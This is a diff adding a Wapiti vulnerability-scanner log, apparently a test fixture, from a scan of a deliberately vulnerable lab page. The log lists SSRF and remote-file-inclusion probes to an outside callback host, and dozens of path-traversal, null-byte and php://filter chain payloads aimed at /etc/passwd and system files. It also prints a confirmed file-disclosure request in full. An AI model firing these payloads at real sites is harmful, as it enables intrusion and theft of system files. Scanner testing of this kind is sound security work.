@@ -1,0 +1,972 @@
+2024-03-20 16:55:05.414 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:05.520 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:05.521 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105
+2024-03-20 16:55:05.521 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:05.529 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:05.695 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 16:55:05.695 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_14f04162.db
+2024-03-20 16:55:05.698 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 5 URLs and forms during the scan
+2024-03-20 16:55:05.730 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 16:55:05.731 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 16:55:05.825 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 16:55:05.839 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 16:55:05.840 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 16:55:05.902 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 16:55:05.913 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:05.913 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/directory_traversal_1.php?page=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F451xsl%2F1%2F70616765%2F (0)
+2024-03-20 16:55:05.930 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:05.936 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:05.945 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:05.945 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F451xsl%2F2%2F666f726d5f73656375726974795f6c6576656c%2F&security_level=2
+2024-03-20 16:55:05.951 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F451xsl%2F2%2F73656375726974795f6c6576656c%2F
+2024-03-20 16:55:05.965 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105
+2024-03-20 16:55:05.965 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F451xsl%2F3%2F666f726d5f627567%2F&bug=105
+2024-03-20 16:55:05.972 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F451xsl%2F3%2F627567%2F
+2024-03-20 16:55:05.992 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=451xsl for results, please wait...
+2024-03-20 16:55:08.085 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 16:55:08.107 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:08.107 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 16:55:08.107 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 16:55:08.163 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 16:55:08.213 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : security_level
+2024-03-20 16:55:08.213 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : security_level
+2024-03-20 16:55:08.257 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : security_level
+2024-03-20 16:55:08.337 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 16:55:08.352 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:08.367 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 16:55:08.367 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 16:55:08.429 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 16:55:08.429 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 16:55:08.548 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 16:55:08.565 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:08.567 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/directory_traversal_1.php?page=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 16:55:08.583 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/directory_traversal_1.php?page=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 16:55:08.600 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/directory_traversal_1.php?page=%2Fetc%2Fpasswd (0)
+2024-03-20 16:55:08.691 | RED      | wapitiCore.attack.mod_file:attack:250 - ---
+2024-03-20 16:55:08.692 | RED      | wapitiCore.attack.mod_file:attack:251 - Linux local file disclosure vulnerability in http://web/directory_traversal_1.php via injection in the parameter page
+2024-03-20 16:55:08.692 | RED      | wapitiCore.attack.mod_file:attack:261 - Evil request:
+2024-03-20 16:55:08.692 | RED      | wapitiCore.attack.mod_file:attack:262 -     GET /directory_traversal_1.php?page=%2Fetc%2Fpasswd HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security_level=0
+2024-03-20 16:55:08.692 | RED      | wapitiCore.attack.mod_file:attack:263 - ---
+2024-03-20 16:55:08.700 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:08.708 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:08.722 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:08.727 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&security_level=2
+2024-03-20 16:55:08.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&security_level=2
+2024-03-20 16:55:08.753 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:08.762 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:08.769 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:08.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:08.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:55:08.793 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&security_level=2
+2024-03-20 16:55:08.801 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:55:08.810 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:08.817 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:08.826 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:55:08.834 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&security_level=2
+2024-03-20 16:55:08.842 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&security_level=2
+2024-03-20 16:55:08.850 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:08.859 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:08.866 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:08.875 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:08.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:08.891 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:08.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:08.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:08.917 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:08.926 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:08.934 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:08.942 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:08.950 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&security_level=2
+2024-03-20 16:55:08.959 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:08.967 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:08.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:08.984 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:08.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.007 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.042 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.053 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.062 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.077 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:09.084 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:09.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:09.105 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:09.116 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.150 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
